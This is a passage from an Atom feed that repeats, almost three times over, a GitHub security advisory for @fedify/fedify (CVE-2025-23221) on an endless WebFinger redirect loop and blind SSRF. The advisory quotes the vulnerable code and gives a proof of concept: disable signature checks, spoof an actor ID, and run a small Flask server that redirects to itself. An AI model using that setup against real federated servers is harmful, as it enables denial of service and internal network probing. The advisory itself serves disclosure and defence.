        <id>https://github.com/advisories/GHSA-c59p-wq67-24wx</id>
        <link href="https://github.com/advisories/GHSA-c59p-wq67-24wx"/>
        <updated>2025-01-21T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>
<h3 id="details">Details</h3>
<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href="https://www.w3.org/TR/activitypub/#security-considerations">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>
<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.
On Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.
As the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>
<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>
<pre><code class="language-javascript">async function getActorHandleInternal(
  actor: Actor | URL,
  options: GetActorHandleOptions = {},
): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {
  const actorId = actor instanceof URL ? actor : actor.id;
  if (actorId != null) {
    const result = await lookupWebFinger(actorId, {
      userAgent: options.userAgent,
      tracerProvider: options.tracerProvider,
    });
    if (result != null) {
      const aliases = [...(result.aliases ?? [])];
      if (result.subject != null) aliases.unshift(result.subject);
      for (const alias of aliases) {
        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);
        if (match != null) {
          const hostname = new URL(`https://${match[2]}/`).hostname;
          if (
            hostname !== actorId.hostname &amp;&amp;
            !await verifyCrossOriginActorHandle(
              actorId.href,
              alias,
              options.userAgent,
              options.tracerProvider,
            )
          ) {
            continue;
          }
          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);
        }
      }
    }
  }
  if (
    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;
    actor.id != null
  ) {
    return normalizeActorHandle(
      `@${actor.preferredUsername}@${actor.id.host}`,
      options,
    );
  }
  throw new TypeError(
    "Actor does not have enough information to get the handle.",
  );
}
</code></pre>
<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>
<pre><code class="language-javascript">async function lookupWebFingerInternal(
  resource: URL | string,
  options: LookupWebFingerOptions = {},
): Promise&lt;ResourceDescriptor | null&gt; {
  if (typeof resource === "string") resource = new URL(resource);
  let protocol = "https:";
  let server: string;
  if (resource.protocol === "acct:") {
    const atPos = resource.pathname.lastIndexOf("@");
    if (atPos &lt; 0) return null;
    server = resource.pathname.substring(atPos + 1);
    if (server === "") return null;
  } else {
    protocol = resource.protocol;
    server = resource.host;
  }
  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);
  url.searchParams.set("resource", resource.href);
  while (true) {
    logger.debug(
      "Fetching WebFinger resource descriptor from {url}...",
      { url: url.href },
    );
    let response: Response;
    try {
      response = await fetch(url, {
        headers: {
          Accept: "application/jrd+json",
          "User-Agent": typeof options.userAgent === "string"
            ? options.userAgent
            : getUserAgent(options.userAgent),
        },
        redirect: "manual",
      });
    } catch (error) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {error}",
        { url: url.href, error },
      );
      return null;
    }
    if (
      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;
      response.headers.has("Location")
    ) {
      url = new URL(
        response.headers.get("Location")!,
        response.url == null || response.url === "" ? url : response.url,
      );
      continue;
    }
    if (!response.ok) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {status} {statusText}.",
        {
          url: url.href,
          status: response.status,
          statusText: response.statusText,
        },
      );
      return null;
    }
    try {
      return await response.json() as ResourceDescriptor;
    } catch (e) {
      if (e instanceof SyntaxError) {
        logger.debug(
          "Failed to parse WebFinger resource descriptor as JSON: {error}",
          { error: e },
        );
        return null;
      }
      throw e;
    }
  }
}
</code></pre>
<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>
<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>
<p>This custom redirect implementation contains multiple issues:
1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.
2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.
3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>
<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href="https://github.com/dahlia/microblog">https://github.com/dahlia/microblog</a>.</li>
<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>
</ol>
<p><strong><em>Victim Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install a Deno server:
<code>curl -fsSL https://deno.land/install.sh | sh</code>
<code>source ~/.bashrc</code>
<code>deno --version #check deno is working</code></li>
<li>Pull the git repository of the victim blog app:
<code>git clone https://github.com/dahlia/fedify.git</code></li>
<li>Modify the federation object to remove signature checks for the sake of easy testing:
On file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>
<li>Change into the blog app directory ( /examples/blog ) and run the app:
<code>deno task preview</code></li>
<li>Surf to the application on the browser, and register a user on the app.</li>
</ol>
<p><strong><em>Attacker Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>
<code>source ~/.bashrc</code>
<code>nvm list-remote</code></li>
<li>Install the latest stable version:
<code>nvm install {latest_ver} #for example: v20.10.0</code>
<code>source ~/.bashrc</code>
<code>npm -v #check it works</code>
<code>node -v #check it works</code></li>
<li>Download the attacker app repository:
<code>git clone https://github.com/dahlia/microblog.git</code></li>
<li>Disable request signature validations:
Edit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>
<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher("/users/{identifier}"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>
<li>Install python flask and create the Python Flask redirect server:
<code>apt update</code>
<code>apt install python3-flask</code></li>
</ol>
<pre><code class="language-python">from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return "hello", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

@app.route('/endlessloop')
def endlessloop():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
</code></pre>
<ol start="8">
<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>
<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>
<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>
<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>
</ol>
<h3 id="impact">Impact</h3>
<ol>
<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>
<li>Validate the scheme while performing a manual redirection handler.</li>
<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23221">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>
<li><a href="https://github.com/advisories/GHSA-c59p-wq67-24wx">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c59p-wq67-24wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:58:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify]]></title>
        <id>https://github.com/advisories/GHSA-c59p-wq67-24wx</id>
        <link href="https://github.com/advisories/GHSA-c59p-wq67-24wx"/>
        <updated>2025-01-21T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>
<h3 id="details">Details</h3>
<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href="https://www.w3.org/TR/activitypub/#security-considerations">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>
<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.
On Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.
As the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>
<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>
<pre><code class="language-javascript">async function getActorHandleInternal(
  actor: Actor | URL,
  options: GetActorHandleOptions = {},
): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {
  const actorId = actor instanceof URL ? actor : actor.id;
  if (actorId != null) {
    const result = await lookupWebFinger(actorId, {
      userAgent: options.userAgent,
      tracerProvider: options.tracerProvider,
    });
    if (result != null) {
      const aliases = [...(result.aliases ?? [])];
      if (result.subject != null) aliases.unshift(result.subject);
      for (const alias of aliases) {
        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);
        if (match != null) {
          const hostname = new URL(`https://${match[2]}/`).hostname;
          if (
            hostname !== actorId.hostname &amp;&amp;
            !await verifyCrossOriginActorHandle(
              actorId.href,
              alias,
              options.userAgent,
              options.tracerProvider,
            )
          ) {
            continue;
          }
          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);
        }
      }
    }
  }
  if (
    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;
    actor.id != null
  ) {
    return normalizeActorHandle(
      `@${actor.preferredUsername}@${actor.id.host}`,
      options,
    );
  }
  throw new TypeError(
    "Actor does not have enough information to get the handle.",
  );
}
</code></pre>
<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>
<pre><code class="language-javascript">async function lookupWebFingerInternal(
  resource: URL | string,
  options: LookupWebFingerOptions = {},
): Promise&lt;ResourceDescriptor | null&gt; {
  if (typeof resource === "string") resource = new URL(resource);
  let protocol = "https:";
  let server: string;
  if (resource.protocol === "acct:") {
    const atPos = resource.pathname.lastIndexOf("@");
    if (atPos &lt; 0) return null;
    server = resource.pathname.substring(atPos + 1);
    if (server === "") return null;
  } else {
    protocol = resource.protocol;
    server = resource.host;
  }
  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);
  url.searchParams.set("resource", resource.href);
  while (true) {
    logger.debug(
      "Fetching WebFinger resource descriptor from {url}...",
      { url: url.href },
    );
    let response: Response;
    try {
      response = await fetch(url, {
        headers: {
          Accept: "application/jrd+json",
          "User-Agent": typeof options.userAgent === "string"
            ? options.userAgent
            : getUserAgent(options.userAgent),
        },
        redirect: "manual",
      });
    } catch (error) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {error}",
        { url: url.href, error },
      );
      return null;
    }
    if (
      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;
      response.headers.has("Location")
    ) {
      url = new URL(
        response.headers.get("Location")!,
        response.url == null || response.url === "" ? url : response.url,
      );
      continue;
    }
    if (!response.ok) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {status} {statusText}.",
        {
          url: url.href,
          status: response.status,
          statusText: response.statusText,
        },
      );
      return null;
    }
    try {
      return await response.json() as ResourceDescriptor;
    } catch (e) {
      if (e instanceof SyntaxError) {
        logger.debug(
          "Failed to parse WebFinger resource descriptor as JSON: {error}",
          { error: e },
        );
        return null;
      }
      throw e;
    }
  }
}
</code></pre>
<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>
<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>
<p>This custom redirect implementation contains multiple issues:
1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.
2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.
3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>
<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href="https://github.com/dahlia/microblog">https://github.com/dahlia/microblog</a>.</li>
<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>
</ol>
<p><strong><em>Victim Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install a Deno server:
<code>curl -fsSL https://deno.land/install.sh | sh</code>
<code>source ~/.bashrc</code>
<code>deno --version #check deno is working</code></li>
<li>Pull the git repository of the victim blog app:
<code>git clone https://github.com/dahlia/fedify.git</code></li>
<li>Modify the federation object to remove signature checks for the sake of easy testing:
On file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>
<li>Change into the blog app directory ( /examples/blog ) and run the app:
<code>deno task preview</code></li>
<li>Surf to the application on the browser, and register a user on the app.</li>
</ol>
<p><strong><em>Attacker Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>
<code>source ~/.bashrc</code>
<code>nvm list-remote</code></li>
<li>Install the latest stable version:
<code>nvm install {latest_ver} #for example: v20.10.0</code>
<code>source ~/.bashrc</code>
<code>npm -v #check it works</code>
<code>node -v #check it works</code></li>
<li>Download the attacker app repository:
<code>git clone https://github.com/dahlia/microblog.git</code></li>
<li>Disable request signature validations:
Edit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>
<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher("/users/{identifier}"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>
<li>Install python flask and create the Python Flask redirect server:
<code>apt update</code>
<code>apt install python3-flask</code></li>
</ol>
<pre><code class="language-python">from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return "hello", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

@app.route('/endlessloop')
def endlessloop():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
</code></pre>
<ol start="8">
<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>
<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>
<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>
<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>
</ol>
<h3 id="impact">Impact</h3>
<ol>
<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>
<li>Validate the scheme while performing a manual redirection handler.</li>
<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-23221">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>
<li><a href="https://github.com/advisories/GHSA-c59p-wq67-24wx">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c59p-wq67-24wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-21T19:58:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify]]></title>
        <id>https://github.com/advisories/GHSA-c59p-wq67-24wx</id>
        <link href="https://github.com/advisories/GHSA-c59p-wq67-24wx"/>
        <updated>2025-01-21T19:58:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>
<h3 id="details">Details</h3>
<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href="https://www.w3.org/TR/activitypub/#security-considerations">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>
<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.
On Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.
As the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>
<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>
<pre><code class="language-javascript">async function getActorHandleInternal(
  actor: Actor | URL,
  options: GetActorHandleOptions = {},
): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {
  const actorId = actor instanceof URL ? actor : actor.id;
  if (actorId != null) {
    const result = await lookupWebFinger(actorId, {
      userAgent: options.userAgent,
      tracerProvider: options.tracerProvider,
    });
    if (result != null) {
      const aliases = [...(result.aliases ?? [])];
      if (result.subject != null) aliases.unshift(result.subject);
      for (const alias of aliases) {
        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);
        if (match != null) {
          const hostname = new URL(`https://${match[2]}/`).hostname;
          if (
            hostname !== actorId.hostname &amp;&amp;
            !await verifyCrossOriginActorHandle(
              actorId.href,
              alias,
              options.userAgent,
              options.tracerProvider,
            )
          ) {
            continue;
          }
          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);
        }
      }
    }
  }
  if (
    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;
    actor.id != null
  ) {
    return normalizeActorHandle(
      `@${actor.preferredUsername}@${actor.id.host}`,
      options,
    );
  }
  throw new TypeError(
    "Actor does not have enough information to get the handle.",
  );
}
</code></pre>
<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>
<pre><code class="language-javascript">async function lookupWebFingerInternal(
  resource: URL | string,
  options: LookupWebFingerOptions = {},
): Promise&lt;ResourceDescriptor | null&gt; {
  if (typeof resource === "string") resource = new URL(resource);
  let protocol = "https:";
  let server: string;
  if (resource.protocol === "acct:") {
    const atPos = resource.pathname.lastIndexOf("@");
    if (atPos &lt; 0) return null;
    server = resource.pathname.substring(atPos + 1);
    if (server === "") return null;
  } else {
    protocol = resource.protocol;
    server = resource.host;
  }
  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);
  url.searchParams.set("resource", resource.href);
  while (true) {
    logger.debug(
      "Fetching WebFinger resource descriptor from {url}...",
      { url: url.href },
    );
    let response: Response;
    try {
      response = await fetch(url, {
        headers: {
          Accept: "application/jrd+json",
          "User-Agent": typeof options.userAgent === "string"
            ? options.userAgent
            : getUserAgent(options.userAgent),
        },
        redirect: "manual",
      });
    } catch (error) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {error}",
        { url: url.href, error },
      );
      return null;
    }
    if (
      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;
      response.headers.has("Location")
    ) {
      url = new URL(
        response.headers.get("Location")!,
        response.url == null || response.url === "" ? url : response.url,
      );
      continue;
    }
    if (!response.ok) {
      logger.debug(
        "Failed to fetch WebFinger resource descriptor: {status} {statusText}.",
        {
          url: url.href,
          status: response.status,
          statusText: response.statusText,
        },
      );
      return null;
    }
    try {
      return await response.json() as ResourceDescriptor;
    } catch (e) {
      if (e instanceof SyntaxError) {
        logger.debug(
          "Failed to parse WebFinger resource descriptor as JSON: {error}",
          { error: e },
        );
        return null;
      }
      throw e;
    }
  }
}
</code></pre>
<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>
<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>
<p>This custom redirect implementation contains multiple issues:
1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.
2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.
3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>
<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href="https://github.com/dahlia/microblog">https://github.com/dahlia/microblog</a>.</li>
<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>
</ol>
<p><strong><em>Victim Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install a Deno server:
<code>curl -fsSL https://deno.land/install.sh | sh</code>
<code>source ~/.bashrc</code>
<code>deno --version #check deno is working</code></li>
<li>Pull the git repository of the victim blog app:
<code>git clone https://github.com/dahlia/fedify.git</code></li>
<li>Modify the federation object to remove signature checks for the sake of easy testing:
On file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>
<li>Change into the blog app directory ( /examples/blog ) and run the app:
<code>deno task preview</code></li>
<li>Surf to the application on the browser, and register a user on the app.</li>
</ol>
<p><strong><em>Attacker Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>
<code>source ~/.bashrc</code>
<code>nvm list-remote</code></li>
<li>Install the latest stable version:
<code>nvm install {latest_ver} #for example: v20.10.0</code>
<code>source ~/.bashrc</code>
<code>npm -v #check it works</code>
<code>node -v #check it works</code></li>
<li>Download the attacker app repository:
<code>git clone https://github.com/dahlia/microblog.git</code></li>
<li>Disable request signature validations:
Edit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>
<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher("/users/{identifier}"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>
<li>Install python flask and create the Python Flask redirect server:
<code>apt update</code>
<code>apt install python3-flask</code></li>
</ol>
<pre><code class="language-python">from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return "hello", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

@app.route('/endlessloop')
def endlessloop():
    return redirect("http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
</code></pre>
<ol start="8">
<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>
<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>
<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>
<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>
</ol>
<h3 id="impact">Impact</h3>
<ol>
<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>
<li>Validate the scheme while performing a manual redirection handler.</li>
